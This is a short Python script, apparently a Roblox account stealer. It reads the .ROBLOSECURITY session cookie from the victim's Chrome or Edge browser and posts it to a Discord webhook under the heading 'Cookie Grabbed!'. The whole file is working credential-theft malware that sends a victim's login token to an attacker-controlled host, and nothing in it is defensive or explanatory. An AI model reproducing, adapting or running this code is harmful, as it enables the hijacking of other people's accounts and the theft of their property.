from gettext import find
import browser_cookie3
from discord_webhook import DiscordWebhook, DiscordEmbed
import grab.defaults

agent = "Browser"


def use_edge():
    try:
        # Use Microsoft Edge to get cookies
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(
            ' for .roblox.com/>')[0].strip()
        agent = "Microsoft Edge"
        return cookie
    except:
        pass


def use_chrome():
    try:
        # Use Microsoft Edge to get cookies
        cookies = browser_cookie3.chromium(domain_name='roblox.com')
        cookies = str(cookies)
        agent = "Chrome"
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(
            ' for .roblox.com/>')[0].strip()
        return cookie
    except:
        pass


def find_proper_browser():
    if (use_chrome() is not None): return use_chrome()
    elif (use_edge() is not None): return use_edge()


def find_proper_agent():
    if (use_chrome() is not None): return "Chrome/Chromium-based"
    elif (use_edge() is not None): return "Microsoft Edge (Chromium Framework)"


# Send to deafult webhook
eb = DiscordEmbed('Cookie Grabbed!', color="03b2f8")

eb.set_timestamp()

if (find_proper_agent().startswith("Microsoft")):
    eb.set_thumbnail(
        "https://th.bing.com/th/id/OIP.ppFdVC_J5Jzbae6F8audvgHaHa?pid=ImgDet&rs=1"
    )
elif (find_proper_agent().startswith("Chrome")):
    eb.set_thumbnail(
        "https://4.bp.blogspot.com/-7totN5UBwVc/UpViNNIW3HI/AAAAAAAAYcg/yevY2mY04Xk/s1600/chrome-os-logo.jpg"
    )
eb.set_author("ROBLOX Website Cookies Using " + find_proper_agent())

eb.add_embed_field(name="User Cookie",
                   value="```" + str(find_proper_browser()) + "```")
eb.set_footer(text=f"😈")

webhook = DiscordWebhook(url=grab.defaults.webhook)

webhook.add_embed(eb)

response = webhook.execute()